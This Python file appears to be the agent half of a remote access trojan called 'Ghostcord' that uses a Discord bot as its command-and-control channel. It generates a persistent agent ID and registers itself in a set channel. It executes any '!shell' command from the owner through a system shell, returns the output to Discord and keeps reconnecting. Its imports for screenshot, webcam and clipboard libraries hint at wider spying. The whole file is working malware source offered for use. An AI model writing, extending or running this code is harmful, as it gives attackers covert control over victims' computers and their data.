import discord
import asyncio
import os
import subprocess
import uuid
import platform
import socket
import sys
import shutil
import time

try:
    import pyautogui
except ImportError:
    pyautogui = None
try:
    import psutil
except ImportError:
    psutil = None
try:
    import pyperclip
except ImportError:
    pyperclip = None
try:
    import cv2
except ImportError:
    cv2 = None
try:
    import pyttsx3
except ImportError:
    pyttsx3 = None
try:
    import requests
except ImportError:
    requests = None

# === CONFIGURATION ===
BOT_TOKEN = "{BOT_TOKEN}"
CHANNEL_ID = int("{CHANNEL_ID}")
OWNER_ID = int("{OWNER_ID}")

# === AGENT ID GENERATION ===
ID_FILE = '.ghostcord-id'
if os.path.exists(ID_FILE):
    with open(ID_FILE, 'r') as f:
        AGENT_ID = f.read().strip()
else:
    AGENT_ID = f'gc{str(uuid.uuid4())[:8]}'
    with open(ID_FILE, 'w') as f:
        f.write(AGENT_ID)

# === COLORIZED CONSOLE ===
class Color:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def cprint(msg, color=Color.OKCYAN):
    print(f"{color}{msg}{Color.ENDC}")

intents = discord.Intents.default()
intents.message_content = True
client = discord.Client(intents=intents)

async def send_result(message, result, file_path=None):
    if file_path and os.path.exists(file_path):
        await message.reply(file=discord.File(file_path))
        os.remove(file_path)
    else:
        await message.reply(result[:1900] or 'No output')

@client.event
async def on_ready():
    cprint(f'[+] Agent {AGENT_ID} connected as {client.user}', Color.OKGREEN)
    await register_agent()

async def register_agent():
    await client.wait_until_ready()
    channel = client.get_channel(CHANNEL_ID)
    if isinstance(channel, discord.TextChannel):
        await channel.send(f'!register {AGENT_ID}')
        cprint(f'[+] Registered agent {AGENT_ID} in channel {CHANNEL_ID}', Color.OKBLUE)
    else:
        cprint(f'[!] Channel {CHANNEL_ID} not found or not a text channel.', Color.WARNING)

@client.event
async def on_message(message):
    if message.channel.id != CHANNEL_ID:
        return
    if message.author.id != OWNER_ID:
        return
    if message.author == client.user:
        return
    content = message.content.strip()
    # Example: !shell <cmd>
    if content.startswith('!shell'):
        command = content[len('!shell'):].strip()
        cprint(f'[>] Received shell command: {command}', Color.OKCYAN)
        try:
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, timeout=30, text=True)
        except Exception as e:
            result = f'Error: {e}'
        await send_result(message, result)
        cprint(f'[<] Sent result for shell command', Color.OKCYAN)
    # Add more command handlers here as needed

async def main_loop():
    while True:
        try:
            await client.start(BOT_TOKEN)
        except Exception as e:
            cprint(f'[!] Disconnected or error: {e}. Reconnecting in 10 seconds...', Color.WARNING)
            await asyncio.sleep(10)

if __name__ == '__main__':
    cprint(f'[*] Starting Ghostcord agent with ID: {AGENT_ID}', Color.HEADER)
    cprint(f'[*] Using channel ID: {CHANNEL_ID}', Color.OKBLUE)
    cprint(f'[*] Using bot token: {BOT_TOKEN[:10]}...', Color.OKCYAN)
    try:
        asyncio.run(main_loop())
    except KeyboardInterrupt:
        cprint('[*] Agent stopped by user.', Color.WARNING) 